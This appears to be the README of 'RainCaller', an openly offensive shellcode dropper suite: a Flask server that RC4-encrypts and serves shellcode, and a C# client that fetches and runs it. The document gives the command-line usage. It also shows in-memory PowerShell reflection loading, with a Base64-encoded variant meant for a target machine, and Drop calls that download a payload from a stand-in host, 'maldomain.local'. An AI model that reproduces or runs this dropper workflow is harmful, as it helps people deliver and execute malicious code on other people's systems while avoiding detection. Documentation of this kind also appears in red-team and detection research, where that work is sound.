# RainCaller
**RainCaller** is a shellcode dropper suite consisting of a *Python3* webserver (server) and a *C#* dropper (client).

***

## Server
The server is located in the */Server* folder.

### Installation
The server-side part of **RainCaller** has some *Python3* dependencies noted down in the `requirements.txt` file. These can be installed with *pip3*:
```
tester@dev:~$ pip3 install -r requirements.txt
Collecting Flask
  Downloading Flask-2.0.1-py3-none-any.whl (94 kB)
     |████████████████████████████████| 94 kB 1.0 MB/s 
  ...
```

### Usage
```
tester@dev:~$ python3 main.py

██████╗  █████╗ ██╗███╗   ██╗ ██████╗ █████╗ ██╗     ██╗     ███████╗██████╗ 
██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║     ██║     ██╔════╝██╔══██╗
██████╔╝███████║██║██╔██╗ ██║██║     ███████║██║     ██║     █████╗  ██████╔╝
██╔══██╗██╔══██║██║██║╚██╗██║██║     ██╔══██║██║     ██║     ██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║██║ ╚████║╚██████╗██║  ██║███████╗███████╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                @v1.1                                                                                                                       
    
usage: main.py [-h] -a ADDRESS -p PORT -u URI -f FILE -k KEY [--ssl_key SSL_KEY] [--ssl_crt SSL_CRT]
main.py: error: the following arguments are required: -a/--address, -p/--port, -u/--uri, -f/--file, -k/--key
```
| Argument      | Description |
| -----------   | ----------- |
| ADDRESS       | What address to listen on (`0.0.0.0`, `127.0.0.1` ...)                      |
| PORT          | What port to listen on                                                      |
| URI           | What URI should the shellcode be retrievable from                           |
| FILE          | Path to a file containing unencrypted shellcode in a binary format          |
| KEY           | Key used to RC4 encrypt the shellcode obtained from the FILE parameter      |
| SSL_KEY       | Optional path to an SSL key (PEM format) if TLS/SSL is to be used           |
| SSL_CRT       | Optional path to an SSL certificate (PEM format) if TLS/SSL is to be used   |

### Example
```
tester@dev:~$ sudo python3 main.py -a 0.0.0.0 -p 443 -u /download -f calc_x64_sc.bin -k HelloWorld --ssl_key key.pem --ssl_crt cert.pem

██████╗  █████╗ ██╗███╗   ██╗ ██████╗ █████╗ ██╗     ██╗     ███████╗██████╗ 
██╔══██╗██╔══██╗██║████╗  ██║██╔════╝██╔══██╗██║     ██║     ██╔════╝██╔══██╗
██████╔╝███████║██║██╔██╗ ██║██║     ███████║██║     ██║     █████╗  ██████╔╝
██╔══██╗██╔══██║██║██║╚██╗██║██║     ██╔══██║██║     ██║     ██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║██║ ╚████║╚██████╗██║  ██║███████╗███████╗███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝
                                @v1.1                                                                                                                         
    
[*]> Starting the server thread...
 * Serving Flask app 'main' (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: off
[+]> Done.
...
```
In other words, start a listener on the global interface on port `443`. Read shellcode from the `calc_x64_sc.bin` file, encrypt it with the string `HelloWorld` and serve it on the `/download` URI. Use the optional SSL/TLS configuration where `key.pem` and `cert.pem` are valid paths to the corresponding TLS/SSL files.

***

## Client
The client is located in the */Client* folder. To compile the client, open the solution in *Visual Studio* and target the release build against `.NET Framework 4.0` or `.NET Framework 4.5`.

### Usage (Normal)
```
C:\Users\Public\Documents\>RainCaller.exe
RainCaller.exe <uri> <enc_key>
```
| Argument      | Description |
| -----------   | ----------- |
| uri           | URL to the remote endpoint which serves the shellcode            |
| enc_key       | Key which the shellcode was encrypted with (used for decryption) |


### Usage (Reflection)
**RainCaller** can be easily reflected into memory:
```
PS C:\Users\tester> [System.Reflection.Assembly]::LoadFile("C:\Users\tester\RainCaller.exe")

GAC    Version        Location
---    -------        --------
False  v4.0.30319     C:\Users\tester\RainCaller.exe

PS C:\Users\tester> [RainCaller.RainCaller]::Drop("hxxps://maldomain.local/shellcode", "shellcodeEncKey")
```
Alternatively, one can Base64 encode (or obfuscate / encrypt) the binary on a local machine:
```
PS C:\Users\tester> $dll = [System.IO.File]::ReadAllBytes("C:\Users\tester\RainCaller.exe")
PS C:\Users\tester> [System.Convert]::ToBase64String($dll)
TVqQAAMAAAAEAAAA//8AA...
```
And afterwards load it on a target machine in the following way:
```
PS C:\Users\tester> [System.Reflection.Assembly]::Load([System.Convert]::FromBase64String("TVqQAAMAAAAEAAAA//8AA..."))

GAC    Version        Location
---    -------        --------
False  v4.0.30319     

PS C:\Users\tester> [RainCaller.RainCaller]::Drop("hxxps://maldomain.local/shellcode", "shellcodeEncKey")
```